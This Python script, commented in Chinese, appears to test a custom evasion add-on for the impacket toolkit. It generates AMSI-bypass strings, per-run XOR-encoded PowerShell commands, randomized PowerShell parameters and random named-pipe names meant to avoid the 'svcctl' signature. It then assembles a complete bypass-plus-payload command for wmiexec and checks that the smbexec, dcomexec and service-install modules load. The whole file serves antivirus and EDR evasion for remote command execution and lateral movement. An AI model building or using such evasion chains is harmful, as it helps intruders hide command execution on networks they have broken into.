import sys
sys.path.insert(0, r"F:\CC\网安\Tools\内网工具\域\impacket\impacket-0.11.0")

# 修复 Cryptodome 缺失
import importlib
try:
    import Cryptodome
except ImportError:
    import Crypto
    sys.modules['Cryptodome'] = Crypto
    print('[+] Cryptodome alias -> Crypto')

from impacket.examples.evasive_encoder import EvasivePayloadEncoder, random_pipe_name
print('[+] evasive_encoder 导入成功')

# 测试1: BXOR 编码每次是否不同
e1 = EvasivePayloadEncoder()
e2 = EvasivePayloadEncoder()
r1, t1 = e1.encode('whoami')
r2, t2 = e2.encode('whoami')
print(f'[+] BXOR 编码1: {r1[:60]}...')
print(f'[+] BXOR 编码2: {r2[:60]}...')
print(f'[+] BXOR 每次唯一: {r1 != r2}')
print(f'[+] 编码类型: {t1}')

# 测试2: AMSI Bypass
a1 = EvasivePayloadEncoder.get_amsi_bypass()
a2 = EvasivePayloadEncoder.get_amsi_bypass_v2()
print(f'[+] get_amsi_bypass(): {a1[:60]}...')
print(f'[+] get_amsi_bypass_v2(): {a2[:60]}...')
print(f'[+] AMSI v1/v2 互异: {a1 != a2}')

# 测试3: 参数随机化 (10次采样)
seen = set()
for i in range(10):
    p = EvasivePayloadEncoder.randomize_ps_params()
    seen.add(p)
    print(f'[+] 参数变体 {i+1}: {p}')
print(f'[+] 参数变体唯一性: {len(seen)}/10')

# 测试4: 管道名采样
from collections import Counter
pipes = [random_pipe_name() for _ in range(200)]
cnt = Counter(pipes)
print(f'[+] 管道名池大小: {len(cnt)}')
print(f'[+] svcctl 出现次数: {cnt.get("svcctl", 0)}/200')

# 测试5: 完整编码链 (模拟 wmiexec 场景)
print('\n--- 完整编码链测试 ---')
e3 = EvasivePayloadEncoder()
amsi = EvasivePayloadEncoder.get_amsi_bypass()
encoded, _ = e3.encode('whoami')
final_cmd = amsi + ';' + encoded
ps_params = EvasivePayloadEncoder.randomize_ps_params()
full_cmd = ps_params + ' -Command "' + final_cmd + '"'
print(f'[+] 完整命令长度: {len(full_cmd)} 字符')
print(f'[+] 参数模板: {ps_params}')
print(f'[+] -Enc 特征消除: {"-Enc" not in full_cmd}')

# 测试6: 工具模块导入
print('\n--- 工具模块导入测试 ---')
try:
    from examples.wmiexec import WMIEXEC
    print('[+] wmiexec 导入 OK')
except Exception as ex:
    print(f'[-] wmiexec 导入失败: {ex}')

try:
    from examples.smbexec import CMDEXEC
    print('[+] smbexec 导入 OK')
except Exception as ex:
    print(f'[-] smbexec 导入失败: {ex}')

try:
    from examples.dcomexec import DCOMEXEC
    print('[+] dcomexec 导入 OK')
except Exception as ex:
    print(f'[-] dcomexec 导入失败: {ex}')

try:
    from impacket.examples.serviceinstall import ServiceInstall
    print('[+] serviceinstall 导入 OK')
except Exception as ex:
    print(f'[-] serviceinstall 导入失败: {ex}')

print('\n[V] 全部测试完成!')
